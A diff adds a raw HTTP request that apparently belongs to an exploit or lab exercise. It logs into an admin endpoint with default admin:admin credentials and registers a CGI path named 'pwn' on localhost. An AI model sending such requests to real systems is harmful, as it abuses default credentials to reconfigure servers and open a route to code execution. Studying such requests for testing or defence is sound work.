@@ -1,0 +1,3 @@
+GET /admin/update_rule?path=/cgi-bin/pwn&type=cgi HTTP/1.1
+Host: 127.0.0.1
+Authorization: Basic YWRtaW46YWRtaW4=
